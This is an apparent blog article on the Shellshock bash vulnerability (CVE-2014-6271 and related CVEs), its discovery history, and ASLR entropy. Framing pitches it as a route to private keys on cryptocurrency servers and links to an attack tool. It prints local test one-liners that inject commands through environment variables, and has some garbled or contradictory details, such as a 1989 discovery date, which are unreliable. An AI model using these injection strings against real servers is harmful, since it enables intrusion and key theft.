
		
<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/G048AB-1024x576.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3631"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>In this article we will look at a series of web server software vulnerabilities discovered in the&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Bash_(Unix_shell)" target="_blank" rel="noreferrer noopener">GNU Bash</a>&nbsp;program &nbsp;.&nbsp;Many Internet services&nbsp;, including Bitcoin blockchain web servers, use Bash to process some requests, for example when executing&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface" target="_blank" rel="noreferrer noopener">CGI&nbsp;</a><em>scripts</em>&nbsp;.&nbsp;The vulnerability allows an attacker to execute arbitrary commands by gaining unauthorized access to computer systems, which allows the attacker to extract&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/" target="_blank" rel="noreferrer noopener">private keys</a>&nbsp;and hidden server data.</p>



<p><em><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/24ShellShockAttack" target="_blank" rel="noreferrer noopener">Shellshock</a></strong></em>&nbsp;is nothing but<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/" target="_blank" rel="noreferrer noopener">a remote code execution vulnerability in bash</a>.&nbsp;This is because&nbsp;<strong>bash</strong>&nbsp;does not properly execute trailing commands when importing a function definition stored in an environment variable.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-34-1024x698.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3620"></figure>



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/24ShellShockAttack" target="_blank" rel="noreferrer noopener">GitHub</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/24ShellShockAttack" target="_blank" rel="noreferrer noopener">BugShellshock</a>&nbsp;affects Bash.&nbsp;Bash is a program that various Unix-based systems use to execute command lines and command scripts.&nbsp;The bug was discovered on August 5, 1989 and released in Bash version 1.03 on September 1, 1989.&nbsp;Shellshock is an escalation of privilege vulnerability that allows system users to execute commands that should not be available to them.</p>



<p><em>The vulnerabilities</em>&nbsp;lie in the fact that Bash, contrary to its declared capabilities, executes commands when receiving some non-standard values ​​of environment variables&nbsp;.&nbsp;Within a few days after the publication of the original vulnerability, several similar errors were discovered, which prevented the prompt release of a version with fixes.</p>



<h2 class="wp-block-heading">Stéphane Chazelas</h2>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-29-1024x485.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3595"></figure>



<p>The original bug was discovered by Stéphane Chazelas on September 12, 2014, who suggested calling it “bashdoor” (similar to&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Backdoor">backdoor</a>&nbsp;).&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">The vulnerability</a>&nbsp;received &nbsp;the number&nbsp;&nbsp;<strong>CVE-2014-6271</strong>&nbsp;in the&nbsp;&nbsp;<a href="http://www.mitre.org/">MITER</a>&nbsp;database &nbsp;and remained unpublished (under embargo) until 14:00 UTC on September 24.&nbsp;The purpose of the above restriction was to give the program authors, distribution creators and other interested organizations time to take the necessary measures.<strong></strong></p>



<p>Analysis of the Bash source code indicates that the vulnerability was introduced into the code around version 1.13 in 1992 or earlier and has remained undetected to the public and undeclared since then.&nbsp;The Bash writing team has difficulty pinpointing the exact time the bug was introduced due to the lack of detail in&nbsp;<a href="https://ru.wikipedia.org/wiki/Changelog">the changelog</a>&nbsp;.</p>



<figure class="wp-block-image is-resized"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-28.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3593" style="width:853px;height:1289px" width="853" height="1289"></figure>



<p><strong><em><a href="https://www.nytimes.com/2014/09/26/technology/security-experts-expect-shellshock-software-bug-to-be-significant.html">Security&nbsp;</a><a href="https://www.nytimes.com/2014/09/26/technology/security-experts-expect-shellshock-software-bug-to-be-significant.html" target="_blank" rel="noreferrer noopener">Experts Expect ‘Shellshock’ Software Bug in Bash to Be Significant</a></em></strong></p>



<p>On September 25, 2014, botnets were already created&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">based on the vulnerability</a>&nbsp;to carry out DoS and DDoS attacks, as well as to scan for vulnerabilities.&nbsp;Millions of systems are believed to be vulnerable.&nbsp;The bug received the maximum rating on the severity scale and is compared in importance to Heartbleed – a bug in OpenSSL (April 2014)</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-25-1024x667.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3585"></figure>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-26.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3586"></figure>



<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/24ShellShockAttack" target="_blank" rel="noreferrer noopener">The Shellshock (bashdoor)</a>&nbsp;vulnerability&nbsp;relates to the&nbsp;&nbsp;<a href="https://ru.wikipedia.org/wiki/Bash">bash</a>&nbsp;program &nbsp;(developed as part of the GNU project), used in many Unix-like operating systems and distributions as a command line interpreter and for executing command scripts.&nbsp;Often installed as the default system interpreter.</p>



<p>On Unix-like and other bash-supported operating systems, each program has a list of name-value pairs called environment&nbsp;&nbsp;<em>variables</em>&nbsp;.&nbsp;When one program runs another, the initial list of environment variables is also passed along.&nbsp;In addition to environment variables, bash also maintains an internal list of functions—named scripts that can be called from an executing bash script.&nbsp;When starting new bash instances from an existing bash, it is possible to transfer (&nbsp;&nbsp;<em>export</em>&nbsp;) the values ​​of existing environment variables and function definitions to the spawned process.&nbsp;Function definitions are exported by encoding them as new environment variables in a special format starting with empty parentheses&nbsp;<code>()</code>, followed by the function definition as a string.&nbsp;New instances of bash scan all environment variables when they start, detecting this format and converting it back into an internal function definition.&nbsp;This conversion is carried out by creating a fragment of bash code based on the value of the environment variable and executing it, that is, “on&nbsp;&nbsp;<em>-the-</em>&nbsp;fly” .&nbsp;Affected versions of bash do not check that the executable fragment contains only a function definition.&nbsp;Thus, if an attacker is able to supply an arbitrary environment variable to bash startup, then it becomes possible to execute arbitrary commands.</p>



<p>On September 27, a high-quality patch was published that adds a special prefix to all exported and imported functions when converting them to environment variables and vice versa&nbsp;<sup><a href="https://ru.wikipedia.org/wiki/Bashdoor#cite_note-15">[15]</a></sup>&nbsp;.</p>



<p>On the same day that the&nbsp;<em><a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">original vulnerability</a></em>&nbsp;and patches were published, Tavis Ormandy discovered a new related bug,&nbsp;&nbsp;<strong>CVE-2014-7169</strong>&nbsp;.&nbsp;Updated fixes became available on September 26th.</p>



<p>While working to fix the original Shellshock bug, Red Hat researcher Florian Weimer discovered two more bugs:&nbsp;&nbsp;<strong>CVE-2014-7186</strong>&nbsp;&nbsp;and&nbsp;&nbsp;<strong>CVE-2014-7187</strong>&nbsp;.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-24-1024x762.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3584"></figure>



<p>On September 26, 2014, two open-source developers, David A. Wheeler and Norihiro Tanaka, noticed that there were additional problems that were still not fixed by the patches available at that time.&nbsp;In an email to the oss-sec and bash bug mailing lists, Wheeler wrote:</p>



<blockquote class="wp-block-quote">
<p>This patch just continues the whack-a-mole work of fixing various parsing errors started by the first patch.&nbsp;The bash parser of course contains many, many, many other vulnerabilities.</p>
</blockquote>



<p>On September 27, 2014, Michal Zalewski announced that he had discovered several other bugs in bash, one of which exploits the fact that bash is often compiled without using the ASLR (Address Space&nbsp;<a href="https://ru.wikipedia.org/wiki/Address_Space_Layout_Randomization">Layout Randomization</a>&nbsp;) protection technique.&nbsp;Zalewski also called for urgent application of the patch from Florian Weimer.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-18.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3574"></figure>



<p>Address space randomization thwarts some types of security attacks by making it more difficult for an attacker to predict target addresses.&nbsp;For example, attackers attempting to perform&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">a return-to-libc_attack attack</a>&nbsp;&nbsp;must find the code to be executed, while other attackers attempting to execute&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Shellcode">Shellcode</a>&nbsp;&nbsp;injected into the stack must first find the stack.&nbsp;In both cases, the system hides the corresponding memory addresses from attackers.&nbsp;These values ​​must be guessed, and an incorrect guess usually cannot be corrected due to application failure.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-19-1024x566.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3575"></figure>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-42.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3634"></figure>



<p>Randomization of the address space layout is based on the low probability that an attacker will guess the location of randomly placed regions.&nbsp;Security is improved by increasing the search space.&nbsp;Thus, address space randomization is more efficient when there is more&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Information_entropy">entropy present in the random offsets.&nbsp;</a>Entropy increases either by increasing the size of the&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Virtual_memory">virtual memory</a>&nbsp;region &nbsp;in which randomization occurs, or by decreasing the period during which randomization occurs.&nbsp;The period is usually implemented as small as possible, so most systems should increase the randomization of the VMA space.</p>



<p>To bypass randomization, attackers must successfully guess the positions of all the areas they want to attack.&nbsp;For data areas such as the stack and heap, where you can load your own code or payload, you can attack more than one state using&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/NOP_slide">NOP slides</a>&nbsp;&nbsp;for code or duplicate copies of the data.&nbsp;This allows an attack to succeed if the region is randomized to one of several values.&nbsp;In contrast, areas of code such as the library base and the main executable must be accurately detected.&nbsp;Often these areas are mixed, such as&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Stack_frame">stack frames being pushed onto the stack and a library being returned to it.</a></p>



<p>The following variables can be declared:</p>



<ul>
<li>{\displaystyle E_{s}}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/b0c1623a2086aff18584e32b589d83c06ac4cdda" alt="E_{s}">&nbsp;(entropy bits of stack top)</li>



<li>{\displaystyle E_{m}}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/3e2d5aa67bc4c46dfb5f6a1d674998ee81063a14" alt="E_{m}">&nbsp;(entropy bits of&nbsp;<code>mmap()</code>&nbsp;base)</li>



<li>{\displaystyle E_{x}}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/029e49fbec18ece71cdd1e68bc478444e2c99d30" alt="Former">&nbsp;(entropy bits of main executable base)</li>



<li>{\displaystyle E_{h}}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/fa200246fd00460ad123dd7140dc00eb537d8cc0" alt="E_{h}">&nbsp;(entropy bits of heap base)</li>



<li>{\displaystyle A_{s}}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/5cc9b664ef7e1dca131e7f345b4321bd3a07a7d8" alt="A_s">&nbsp;(attacked bits per attempt of stack entropy)</li>



<li>{\displaystyle A_{m}}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/58f710c420b53609029176c7bf3717f9d79b0e50" alt="A_{m}">&nbsp;(attacked bits per attempt of&nbsp;<code>mmap()</code>&nbsp;base entropy)</li>



<li>{\displaystyle A_{x}}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/626cb5d94c04152accd89eee76eb7a2613376484" alt="A_x">&nbsp;(attacked bits per attempt of main executable entropy)</li>



<li>{\displaystyle A_{h}}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/dc8b8d358050987844979c9130c3d19c50b4fca0" alt="A_h">&nbsp;(attacked bits per attempt of heap base entropy)</li>



<li>{\displaystyle \alpha }<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/b79333175c8b3f0840bfb4ec41b8072c83ea88d3" alt="\alpha ">&nbsp;(attempts made)</li>



<li>{\displaystyle N}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/f5e3890c981ae85503089652feb48b191b57aae3" alt="N">&nbsp;(total amount of entropy:&nbsp;{\displaystyle N=(E_{s}-A_{s})+(E_{m}-A_{m})+(E_{x}-A_{x})+(E_{h}-A_{h})\,}<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/1772954f7755d9874518be79d147d5a13479ee8f" alt="{\displaystyle N=(E_{s}-A_{s})+(E_{m}-A_{m})+(E_{x}-A_{x})+(E_{h}-A_{h})\,}">)</li>
</ul>



<p>To calculate the attacker’s probability of success, we must assume that the number of attempts&nbsp;&nbsp;<em>α</em>&nbsp;&nbsp;were completed without being interrupted by a signature IPS, law enforcement, or other factor;&nbsp;in case of brute force, the daemon cannot be restarted.&nbsp;We also need to figure out how many bits matter and how many are attacked on each attempt, leaving as many bits for the attacker to defeat.</p>



<p>The following formulas represent the probability of success for a given set of&nbsp;&nbsp;<em>α</em>&nbsp;&nbsp;-attempts on&nbsp;&nbsp;<em>N</em>&nbsp;&nbsp;bits of entropy.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-21.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3577"></figure>



<p>In many systems{\displaystyle 2^{N}}&nbsp;<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/f3cc22b5fa0e34487c8a6153965408e004c6e253" alt="2^H">can be in the thousands or millions;&nbsp;on modern 64-bit systems these numbers typically reach into the millions, Hector Marco-Gisbert and Ismael Ripoll showed in 2014 how to bypass ASLR on 64-bit systems in less than one second under certain circumstances.&nbsp;&nbsp;</p>



<p><strong><a href="https://cryptodeep.ru//doc/On_the_Effectiveness_of_Full-ASLR_on_64-bit_Linux.pdf">On the Effectiveness of Ful</a><a href="https://cryptodeep.ru//doc/On_the_Effectiveness_of_Full-ASLR_on_64-bit_Linux.pdf" target="_blank" rel="noreferrer noopener">l-ASLR on 64-bit Linux</a></strong></p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-23.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3579"></figure>



<p>For 32-bit systems at 2004 computer speeds, which have 16 bits for address randomization, Shacham and colleagues claim that “…16 bits of address randomization can be overcome with a Brute-force attack in minutes&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/Brute_force_attack">.</a>&nbsp;&nbsp;“</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-27.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3590"></figure></div>


<p>&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/64-bit"></a><sup><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#cite_note-5"></a></sup><a href="https://en.wikipedia.org/wiki/Brute_force_attack"></a><sup><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#cite_note-6"></a></sup>The authors’ claim depends on the ability to attack the same application multiple times without any delay.&nbsp;Proper ASLR implementations, such as those included in grsecurity, provide several ways to make such brute-force attacks impossible.&nbsp;One method involves preventing the executable from running for a configurable period of time if it fails a certain number of times.</p>



<p>Android, and perhaps other systems, will implement&nbsp;&nbsp;<em>library load order randomization</em>&nbsp;&nbsp;, a form of ASLR that randomizes the order in which libraries are loaded.&nbsp;This provides very little entropy.&nbsp;Below is the approximate number of bits of entropy provided for each required library;&nbsp;this does not yet take into account the different sizes of libraries, so the actual entropy obtained is indeed somewhat higher.&nbsp;Note that attackers usually only need one library;&nbsp;the math is more complex with multiple libraries and is also shown below.&nbsp;</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-22-1024x427.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3578"></figure>



<p>Note that the case where the attacker uses only one library is a simplification of a more complex formula:</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-20.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3576"></figure>



<p>These values ​​tend to be low even for large values ​​of&nbsp;&nbsp;<em>l</em>&nbsp;&nbsp;, which is most important since attackers can usually only use&nbsp;&nbsp;<a href="https://en.wikipedia.org/wiki/C_standard_library">the C standard library</a>&nbsp;&nbsp;, and so it can often be assumed that {\displaystyle \beta \,=1}&nbsp;<img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/781e0970c23b7832f33b25fb49ea266766b57928" alt="\beta\,=1">.&nbsp;However, even for a small number of libraries, some entropy gains can be achieved here;&nbsp;Thus, it is potentially interesting to combine library load order randomization with VMA address randomization to gain a few extra bits of entropy.&nbsp;Note that these extra bits of entropy will not apply to other mmap() segments, only to libraries.</p>



<h4 class="wp-block-heading"></h4>



<p><strong><em><a href="https://cryptodeeptech.ru/endomorphism/">Entropy Decrease:</a></em></strong></p>



<figure class="wp-block-embed is-type-wp-embed is-provider-crypto-deep-tech wp-block-embed-crypto-deep-tech"><div class="wp-block-embed__wrapper">
<blockquote class="wp-embedded-content" data-secret="AaHHXaJJTi" style="display: none;"><a href="https://cryptodeeptech.ru/endomorphism/">Speed ​​up secp256k1 with endomorphism</a></blockquote><iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" title="«Speed ​​up secp256k1 with endomorphism» — «CRYPTO DEEP TECH»" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/saved_resource.html" data-secret="AaHHXaJJTi" width="600" height="256" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>
</div></figure>



<figure class="wp-block-embed is-type-rich is-provider-вставить-обработчик wp-block-embed-вставить-обработчик"><div class="wp-block-embed__wrapper">
https://youtube.com/watch?v=DH6FyNY-Gh0%3Fsi%3D5PHh9CqaafkiHKYg
</div></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">List of vulnerabilities:</h2>



<h3 class="wp-block-heading">CVE-2014-6271</h3>



<p>Original bashdoor: A special kind of environment variable consists of a definition of the exported function followed by arbitrary commands.&nbsp;Vulnerable versions of Bash execute these arbitrary commands during startup.&nbsp;Error example: env x='() { :;};&nbsp;echo Vulnerable’ bash -c “echo Test print”</p>



<p>On vulnerable systems, this test will print the phrase “Vulnerable” by executing the command from the x environment variable.</p>



<h3 class="wp-block-heading">CVE-2014-6277</h3>



<p>As of September 29,&nbsp;<a href="https://cryptodeeptech.ru/blockchain-attack-vectors/">details of the vulnerability had not been publicly disclosed</a>&nbsp;.</p>



<h3 class="wp-block-heading">CVE-2014-6278</h3>



<p>As of September 29, details of the vulnerability had not been publicly disclosed.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-2.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3552"></figure></div>


<h3 class="wp-block-heading">CVE-2014-7169</h3>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-1-1024x599.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3550"></figure></div>


<p>Discovered by&nbsp;&nbsp;<a href="https://ru.wikipedia.org/w/index.php?title=Tavis_Ormandy&amp;action=edit&amp;redlink=1">Tavis Ormandy</a>&nbsp;&nbsp;while working on&nbsp;&nbsp;<strong>CVE-2014-6271</strong>&nbsp;:</p>



<p><code>env X='() { (a)=&gt;\' sh -c "echo date"; cat echo</code></p>



<p>The test causes “echo” to become the filename to redirect the output to and “date” to be executed.&nbsp;The bug has received the number&nbsp;&nbsp;<strong>CVE-2014-7169</strong>&nbsp;.</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-1024x430.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3549"></figure>



<p>An example of error 7169 on a system that received a fix for&nbsp;&nbsp;<strong><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271">CVE-2014-6271</a></strong>&nbsp;&nbsp;but not for&nbsp;&nbsp;<strong><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169">CVE-2014-7169</a></strong>&nbsp;:&nbsp;<sup><a href="https://ru.wikipedia.org/wiki/Bashdoor#cite_note-host-project-32">[32]</a></sup>&nbsp;$ X='() { (a)=&gt;\’ bash -c “echo date” bash: X : line 1: syntax error near unexpected token `=’ bash: X: line 1: `’ bash: error importing&nbsp;<strong>function</strong>&nbsp;definition&nbsp;<strong>for</strong>&nbsp;`X’ [root@ ec2-user]&nbsp;<em># cat echo</em>&nbsp;Fri Sep 26 01:37:16 UTC 2014</p>



<p>Fixing both&nbsp;&nbsp;<strong><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271">CVE-2014-6271</a></strong>&nbsp;&nbsp;and&nbsp;&nbsp;<strong><a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169">CVE-2014-7169</a></strong>&nbsp;&nbsp;will break the test: $ X='() { (a)=&gt;\’ bash -c “echo date” date $ cat echo cat: echo: No such file or directory</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-16-1024x439.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3572"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-17-1024x453.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3573"></figure>



<h3 class="wp-block-heading">CVE-2014-7186</h3>



<p>The error is caused by similar problems in Bash code but is affected by repeating “&lt;&lt;EOF” over and over again Testbash -c ‘true &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF &lt;&lt;EOF’ ||&nbsp;echo “Vulnerable by CVE-2014-7186, redir_stack” The vulnerable system will display the text “Vulnerable by CVE-2014-7186, redir_stack.”</p>



<h3 class="wp-block-heading">CVE-2014-7187</h3>



<p>The error is caused by similar problems in Bash code, but is affected by multiple repetitions of “done”Test(&nbsp;<strong>for</strong>&nbsp;x&nbsp;<strong>in</strong>&nbsp;{1..200} ;&nbsp;<strong>do</strong>&nbsp;echo “for x$x in ; do :”;&nbsp;<strong>done</strong>&nbsp;;&nbsp;<strong>for</strong>&nbsp;x&nbsp;<strong>in</strong>&nbsp;{1. .200} ;&nbsp;<strong>do</strong>&nbsp;echo&nbsp;<strong>done</strong>&nbsp;;&nbsp;<strong>done</strong>&nbsp;) |&nbsp;bash ||&nbsp;echo “Vulnerable by CVE-2014-7187, word_lineno” A vulnerable system will display the text “Vulnerable by CVE-2014-7187, word_lineno.”</p>



<figure class="wp-block-image"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-15.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3570"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Attack vectors</h2>



<p>Within an hour after the Bash vulnerability was published, reports appeared of computer systems being hacked using it.&nbsp;On September 25, various “in the wild” attacks were confirmed, ranging from simple&nbsp;&nbsp;<em>DoS to the deployment of&nbsp;</em><em>command &amp; control</em>&nbsp;servers&nbsp;&nbsp;&nbsp;through the malicious “BASHLITE” system.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./ShellShock Attack vulnerability on Bitcoin Ethereum server discovered in GNU Bash cryptocurrency exchange - CRYPTO DEEP TECH_files/image-14.png" alt="ShellShock Attack vulnerability on &quot;Bitcoin&quot; &amp; &quot;Ethereum&quot; server discovered in GNU Bash cryptocurrency exchange" class="wp-image-3568"></figure></div>


